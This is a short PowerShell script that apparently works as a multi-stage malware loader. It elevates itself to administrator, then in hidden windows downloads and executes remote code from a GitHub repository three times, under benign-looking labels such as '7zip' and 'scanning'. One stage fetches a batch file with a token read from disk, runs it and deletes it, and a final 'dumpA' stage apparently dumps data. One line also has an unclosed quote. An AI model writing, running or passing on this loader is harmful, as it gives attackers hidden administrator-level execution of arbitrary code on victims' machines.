if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }

#7zip
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/unzip_124509')"

#scanning
$tkn= Get-Content "C:\CRDemo\tkn.txt
$headers=@{"Authorization"="token ghp_"+$tkn; "Accept"="application/octet-stream"}
Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/scan_124509" -Headers $headers -OutFile $env:TEMP\scan.bat
Start-Process $env:TEMP\scan.bat
Remove-Item $env:TEMP\scan.bat

#dumpA
powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/cdumpa_124509')"
